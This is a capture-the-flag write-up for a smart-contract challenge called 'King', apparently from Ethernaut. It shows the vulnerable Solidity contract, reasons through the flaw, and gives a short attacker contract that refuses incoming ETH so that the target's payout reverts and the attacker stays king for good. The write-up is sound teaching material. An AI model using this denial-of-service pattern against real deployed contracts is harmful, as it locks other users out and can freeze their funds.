# **Level 9 -- King**
## **Contract to hack**
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
`````` 
---
## ***Objectives***
* Become the king and prevent anyone else from becoming the king afterwards 
---
## ***Thought Process***
This contract lacks any function that can be actively triggered by us. The `_king` function serves as a view function, so we do not need to use it. We only have the `receive()` function that we can use.

As we know, the `receive` function is invoked when the contract receives ETH. Once we send more ETH than the old king, we can satisfy the `msg.value >= prize` requirement. Consequently, the previous king will get our ETH, and we ascend to the position of the new king.

Nonetheless, if someone sends an ETH amount surpassing ours, they will take away our king. To maintain our kingship indefinitely, we should let the `receive` function be reverted. Thus, the challenge circles back to receiving ETH. It is obvious that EOA can not make the ETH transaction to revert. As a result, our strategy should be to create a contract without `receive() payable` or `fallback() payable` function, which would prompt the transaction to fail upon receiving ETH.

---
## ***Solution***
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHacker {
    function kingship(address payable to) public payable {
        (bool success, ) = address(to).call{value: msg.value}("");
        require(success, "error");
    }
}
```



